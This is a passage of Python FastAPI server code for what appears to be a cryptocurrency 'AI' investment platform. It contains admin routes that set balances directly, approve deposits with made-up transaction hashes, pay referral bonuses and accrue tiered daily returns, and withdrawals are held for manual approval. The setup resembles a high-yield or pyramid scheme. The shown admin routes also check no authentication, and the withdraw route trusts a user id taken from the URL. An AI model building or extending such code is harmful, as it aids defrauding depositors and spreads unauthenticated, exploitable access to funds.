        # FIXED: Also distribute referral bonus when admin adds balance (for testing referral)
        try: distribute_referral(req.user_id, req.amount)
        except: pass
        return {"ok": True}
    elif req.action == "add_withdrawable": conn.execute("UPDATE users SET withdrawable=withdrawable+?, referral_earnings=referral_earnings+? WHERE user_id=?", (req.amount, req.amount, req.user_id))
    elif req.action == "set_balance": conn.execute("UPDATE users SET balance=? WHERE user_id=?", (req.amount, req.user_id))
    elif req.action == "delete": conn.execute("DELETE FROM users WHERE user_id=?", (req.user_id,))
    conn.commit()
    return {"ok": True}

class ApproveReq(BaseModel):
    id: int; action: str; tx_hash: str = ""; note: str = ""

@app.post("/api/admin/withdraw/action")
def wd_action(r: ApproveReq):
    wd = conn.execute("SELECT user_id, amount, address, network FROM withdrawals WHERE id=?", (r.id,)).fetchone()
    if not wd: return {"error":"not found"}
    if r.action=="approve":
        conn.execute("UPDATE withdrawals SET status='approved', tx_hash=?, admin_note=? WHERE id=?", (r.tx_hash, r.note or "Sent from self-custody", r.id))
        conn.execute("UPDATE users SET total_withdraw=total_withdraw+? WHERE user_id=?", (wd[1], wd[0]))
    else:
        conn.execute("UPDATE withdrawals SET status='rejected', admin_note=? WHERE id=?", (r.note or "Rejected", r.id))
        conn.execute("UPDATE users SET withdrawable=withdrawable+? WHERE user_id=?", (wd[1], wd[0]))
    conn.commit()
    return {"ok":True}

@app.post("/api/admin/deposit/action")
def dep_action(r: ApproveReq):
    dep = conn.execute("SELECT user_id, amount, expected_amount FROM deposits WHERE id=?", (r.id,)).fetchone()
    if not dep: return {"error":"not found"}
    if r.action=="approve":
        now = datetime.datetime.utcnow().isoformat()
        fake_tx = r.tx_hash or f"admin_approved_{r.id}_{int(time.time())}"
        conn.execute("UPDATE deposits SET status='verified', tx_hash=?, actual_amount=expected_amount, verified_at=? WHERE id=?", (fake_tx, now, r.id))
        conn.execute("INSERT OR IGNORE INTO used_tx_hashes (tx_hash, used_at) VALUES (?,?)", (fake_tx, now))
        old_row = conn.execute("SELECT balance FROM users WHERE user_id=?", (dep[0],)).fetchone()
        old_bal = old_row[0] or 0
        new_bal = old_bal + dep[2]
        tier_idx, _, daily_pct = get_tier_index(new_bal)
        per_hour = (new_bal * daily_pct / 100) / 24 if daily_pct>0 else 0
        ai_end = (datetime.datetime.utcnow() + datetime.timedelta(days=30)).isoformat()
        conn.execute("UPDATE users SET balance=?, profit_per_hour=?, daily_percent=?, total_deposit=total_deposit+?, ai_end=? WHERE user_id=?", (new_bal, per_hour, daily_pct, dep[2], ai_end, dep[0]))
        conn.commit()
        distribute_referral(dep[0], dep[2])
    else:
        conn.execute("UPDATE deposits SET status='failed' WHERE id=?", (r.id,))
        conn.commit()
    return {"ok":True}

class WithdrawReq(BaseModel):
    amount: float; address: str; network: str

@app.post("/api/withdraw/request/{user_id}")
def withdraw_req(user_id: int, r: WithdrawReq):
    if user_id == 0: user_id = 123456789
    ensure_user(user_id)
    recalc_profit(user_id)
    now = datetime.datetime.utcnow(); today_str = now.date().isoformat()
    user_row = conn.execute("SELECT withdrawable, created_at, last_withdraw_date, is_banned, total_withdraw FROM users WHERE user_id=?", (user_id,)).fetchone()
    if not user_row: return {"error": "User not found"}
    if user_row[3] == 1: return {"error": "Account banned"}
    withdrawable = user_row[0] or 0
    if r.amount < 10: return {"error": "Min withdraw 10 USDT"}
    if withdrawable < r.amount: return {"error": f"Insufficient. You have {withdrawable:.2f} USDT"}
    last_wd_date = user_row[2] or ""
    if last_wd_date == today_str: return {"error": "Once per day only. Try tomorrow."}
    today_count = conn.execute("SELECT COUNT(*) FROM withdrawals WHERE user_id=? AND DATE(created_at)=DATE('now')", (user_id,)).fetchone()[0]
    if today_count > 0: return {"error": "Once per day only. Try tomorrow."}
    new_w = withdrawable - r.amount
    conn.execute("UPDATE users SET withdrawable=?, last_withdraw_date=? WHERE user_id=?", (new_w, today_str, user_id))
    conn.execute("INSERT INTO withdrawals (user_id, amount, address, network, status, created_at, auto_approved) VALUES (?,?,?,?,?,?,?)",
                 (user_id, r.amount, r.address, r.network, "pending", now.isoformat(), 0))
    conn.commit()
    return {"ok": True, "new_withdrawable": new_w, "message": f"Withdrawal of {r.amount} USDT requested. Admin will send from self-custody wallet."}

@app.get("/")
def root(): return FileResponse("index.html")
@app.get("/admin")
def admin_page(): return FileResponse("admin.html")
@app.get("/health")
def health(): return {"ok": True, "self_custody": True, "quick_stats_fixed": True}
